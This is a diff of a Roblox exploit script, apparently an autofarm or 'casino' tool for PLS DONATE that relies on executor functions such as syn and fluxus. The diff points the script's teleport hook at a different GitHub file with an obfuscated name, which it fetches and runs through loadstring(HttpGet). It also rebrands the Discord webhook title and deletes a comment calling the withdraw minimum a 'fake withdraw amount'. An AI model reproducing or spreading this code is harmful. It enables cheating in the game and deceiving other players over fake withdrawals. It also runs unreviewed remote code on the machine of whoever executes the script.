@@ -30,15 +30,15 @@ local unclaimed = {}
 local errCount = -1
 
 local queueonteleport = (syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport)
-queueonteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/CF-Trail/tzechco-PlsDonateAutofarmBackup/main/casino.lua'))()")
+queueonteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/NexKacperr/Aerval/main/IKOERUF()%24weiug9re7u890guISR(G%26*r0eg9i0ERW*F-0934589tig9reyg0e85g94y598tu5g90eur9g4u50gure90g.lua'))()")
 
 if not getgenv().settin then
 	getgenv().settin = {
 		['WebHook'] = {
 			['Webhook'] = "",
 		},
-		['ServerHopDelay'] = 15, -- minutes, resets every donation
-		['MinimumWithdrawAmount'] = 1000, -- fake withdraw amount
+		['ServerHopDelay'] = 15,
+		['MinimumWithdrawAmount'] = 500,
 		['Beg'] = {
 			['Delay'] = 120,
 			['Messages'] = {
@@ -102,7 +102,7 @@ function webhook(...)
 	local c = game:GetService("MarketplaceService")
 	local c = c:GetProductInfo(game.PlaceId, Enum.InfoType.Asset)
 	local a = {
-		["title"] = "> CF-Trail's Casino™ | **" .. Players.LocalPlayer.Name .. " got donated! :D**",
+		["title"] = "> Aerval - Donations™ | **" .. Players.LocalPlayer.Name .. " got donated! :D**",
 		["description"] = "https://discord.gg/8jxEbMAEQD",
 		["type"] = "rich",
 		["color"] = tonumber(getgenv().embedcolor),
